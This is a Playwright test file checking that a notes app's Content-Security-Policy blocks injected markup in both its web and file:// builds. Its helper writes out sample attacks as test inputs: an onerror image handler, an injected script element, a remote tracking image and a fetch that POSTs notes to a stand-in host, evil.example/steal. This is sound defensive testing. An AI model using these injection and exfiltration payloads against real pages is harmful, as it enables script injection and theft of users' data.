// e2e/content-security-policy.spec.ts — the page's Content-Security-Policy (scripts/build.mjs) is the backstop for
// the markdown and paste sanitizers: if markup ever slipped past them, it still could not run script, load a remote
// resource or send the decrypted notes anywhere. Both builds, opened the way users open them.
import { test, expect, type Page, type Request } from '@playwright/test'
import { pathToFileURL } from 'node:url'
import { resolve } from 'node:path'
import { E2E_BASE_URL } from '../playwright.config'
import { blockUpdateCheck } from './helpers'

/** Injects the payloads a sanitizer bypass would carry and reports which of them got to act. */
async function attempt(page: Page): Promise<{ handler: boolean; script: boolean; remoteImage: boolean; exfil: boolean }> {
  // Chromium reports a load the policy refused as a request that failed with 'csp': it never left the page.
  const remote: Request[] = []
  const refused = new Set<Request>()
  page.on('request', (r) => { if (r.url().includes('evil.example')) remote.push(r) })
  page.on('requestfailed', (r) => { if (r.failure()?.errorText === 'csp') refused.add(r) })
  const ran = await page.evaluate(async () => {
    const w = window as unknown as { __ttHandler?: number; __ttScript?: number }
    document.body.insertAdjacentHTML('beforeend', '<img src="x" onerror="window.__ttHandler = 1">')
    const s = document.createElement('script')
    s.textContent = 'window.__ttScript = 1'
    document.body.appendChild(s)
    document.body.insertAdjacentHTML('beforeend', '<img src="https://evil.example/pixel.png">')
    await fetch('https://evil.example/steal', { method: 'POST', body: 'notes' }).catch(() => {})
    await new Promise((r) => setTimeout(r, 300))
    return { handler: w.__ttHandler === 1, script: w.__ttScript === 1 }
  })
  // A request that left the page counts even though the made-up host never answers.
  const left = (suffix: string) => remote.some((r) => r.url().endsWith(suffix) && !refused.has(r))
  return { ...ran, remoteImage: left('pixel.png'), exfil: left('/steal') }
}

const BLOCKED = { handler: false, script: false, remoteImage: false, exfil: false }

test('web app: injected markup can neither run script nor reach another origin', async ({ page }) => {
  await blockUpdateCheck(page)
  await page.goto(`${E2E_BASE_URL}/app.html`)
  await expect(page.locator('.tt-start-screen')).toBeVisible()
  expect(await attempt(page)).toEqual(BLOCKED)
})

test('local file: the same policy holds over file://', async ({ page }) => {
  await blockUpdateCheck(page)
  await page.goto(pathToFileURL(resolve('dist/app.html')).href)
  await expect(page.locator('.tt-start-screen')).toBeVisible()
  expect(await attempt(page)).toEqual(BLOCKED)
})
